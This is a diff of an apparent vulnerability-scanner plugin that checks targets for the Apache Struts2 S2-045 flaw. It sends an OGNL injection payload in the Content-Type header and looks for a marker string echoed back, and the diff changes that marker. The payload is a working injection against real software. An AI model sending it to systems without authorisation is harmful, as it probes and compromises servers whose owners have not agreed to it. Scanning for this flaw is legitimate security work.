@@ -26,7 +26,7 @@ class P(T):
         timeout=3
         result['result']=False
         res=None
-        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('123456789')).(#o.close())}"
+        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('structs123456789')).(#o.close())}"
         # print target_url
         try:
             headers = {"Content-Type":payload}
@@ -39,9 +39,9 @@ class P(T):
             if res is not None:
                 res.close()
                 del res
-        if res_html.find("123456789") <> -1:
+        if res_html.find("structs123456789") <> -1:
 	    cprint(target_url + '存在structs045漏洞', 'red')
-            info = target_url + "struts045  Vul"
+            info = target_url + " struts045  Vul"
             result['result']=True
             result['VerifyInfo'] = {}
             result['VerifyInfo']['type']='struts045 Vul'
